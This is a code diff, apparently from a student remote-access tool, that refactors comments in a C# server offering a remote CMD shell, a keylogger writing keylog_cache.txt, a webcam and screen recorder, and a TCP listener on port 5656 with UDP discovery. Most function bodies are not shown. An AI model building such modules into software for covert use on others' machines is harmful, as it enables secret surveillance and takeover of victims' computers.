@@ -15,8 +15,10 @@ using System.Text;
 using System.Threading;
 using System.Timers;
 using System.Windows.Forms;
+
 using KeyLogger;
 using Microsoft.Win32;
+
 using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
 
@@ -24,20 +26,33 @@ namespace ServerApp
 {
     public partial class server : Form
     {
+        // ==================== FIELDS & VARIABLES ====================
+
+        // Connection State
         private volatile bool isClientConnected = false;
 
-        Thread serverThread; // Luồng chính để chạy Server lắng nghe TCP
-        Thread udpDiscoveryThread; // Luồng riêng cho UDP Discovery
-        Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
-        WebcamRecorder.WebcamCapture webcamCapture = null; // Instance cho Webcam
-        ScreenRecorder.ScreenCapture screenCapture = null; // Instance cho Screen Recorder
+        // Threads
+        Thread serverThread;        // Luồng chính để chạy Server lắng nghe TCP
+        Thread udpDiscoveryThread;  // Luồng riêng cho UDP Discovery
+        Thread tklog = null;        // Luồng riêng cho Keylogger để không chặn UI
         
+        // Module Instances
+        WebcamRecorder.WebcamCapture webcamCapture = null;  // Instance cho Webcam
+        ScreenRecorder.ScreenCapture screenCapture = null;  // Instance cho Screen Recorder
+        
+        // Performance Counters
         PerformanceCounter cpuCounter;
         PerformanceCounter ramCounter;
         System.Timers.Timer statsTimer;
 
+        // System Info Cache
         string cachedSystemInfo = "0|0|Checking...|...|...|...";
         String staticInfo = "";
+        
+        // Shell Module State
+        public string ShellCurrentPath = "";
+
+        // ==================== CONSTRUCTOR ====================
 
         public server()
         {
@@ -120,6 +135,8 @@ namespace ServerApp
             catch { }
         }
 
+        // ==================== EVENT HANDLERS ====================
+
         // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
         private void server_FormClosing(object sender, FormClosingEventArgs e)
         {
@@ -142,6 +159,8 @@ namespace ServerApp
             udpDiscoveryThread.IsBackground = true;
             udpDiscoveryThread.Start();
         }
+
+        // ==================== TCP SERVER CORE ====================
 
         // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
         private void StartServerLoop()
@@ -193,8 +212,6 @@ namespace ServerApp
         }
 
         // Phân tích cú pháp lệnh gửi từ Client
-        // File: server.cs - Cập nhật hàm HandleClientCommunication
-
         private void HandleClientCommunication()
         {
             String s = "";
@@ -231,11 +248,7 @@ namespace ServerApp
             catch { s = "QUIT"; }
         }
 
-        // --- KHAI BÁO BIẾN TOÀN CỤC CHO MODULE SHELL (Đặt bên ngoài các hàm) ---
-        // Biến này sẽ lưu vị trí hiện tại của CMD, không bị mất đi khi Client ngắt kết nối
-        public string ShellCurrentPath = "";
-
-        // --- MODULE REMOTE SHELL (CMD) ---
+        // ==================== MODULE: REMOTE SHELL (CMD) ====================
         public void remote_shell()
         {
             String cmd = "";
@@ -351,7 +364,8 @@ namespace ServerApp
             }
         }
 
-        // --- MODULE KEYLOGGER ---
+        // ==================== MODULE: KEYLOGGER ====================
+
         public void keylog()
         {
             KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
@@ -415,7 +429,8 @@ namespace ServerApp
             }
         }
 
-        // --- MODULE SCREENSHOT ---
+        // ==================== MODULE: SCREENSHOT ====================
+
         public void takepic()
         {
             String ss = "";
@@ -445,7 +460,8 @@ namespace ServerApp
             }
         }
 
-        // --- MODULE PROCESS & APPLICATION ---
+        // ==================== MODULE: PROCESS & APPLICATION ====================
+
         // Sử dụng chung logic ProcessHandler để giảm lặp code
         public void application() { ProcessHandler("App"); }
         public void process() { ProcessHandler("All"); }
@@ -520,7 +536,8 @@ namespace ServerApp
             }
         }
 
-        // === UDP DISCOVERY LISTENER ===
+        // ==================== MODULE: UDP DISCOVERY ====================
+
         // Lắng nghe UDP broadcasts từ Python Web Server để tự động discover
         private void StartUdpDiscoveryListener()
         {
@@ -609,7 +626,8 @@ namespace ServerApp
             }
         }
 
-        // ==================== MODULE WEBCAM ====================
+        // ==================== MODULE: WEBCAM ====================
+
         /// <summary>
         /// Handler cho WEBCAM module
         /// Commands: ON, OFF, GET_FRAME, START_REC, STOP_REC, STATUS, GET_VIDEO, QUIT
@@ -775,7 +793,8 @@ namespace ServerApp
             }
         }
 
-        // --- MODULE SCREEN RECORDING (MỚI) ---
+        // ==================== MODULE: SCREEN RECORDING ====================
+
         public void screen_rec()
         {
             String cmd = "";
@@ -891,7 +910,8 @@ namespace ServerApp
             }
         }
 
-        // --- MODULE SYSTEM INFO ---
+        // ==================== MODULE: SYSTEM INFO ====================
+
         private string GetHardwareInfo(string table, string property)
         {
             try
@@ -963,8 +983,7 @@ namespace ServerApp
             catch { }
         }
 
-        // --- 4. SỬA HÀM GỬI INFO (send_system_info) ---
-        // Hàm này giờ chỉ việc đọc cache -> Cực nhanh
+        // Gửi System Info đã được cache
         public void send_system_info()
         {
             try
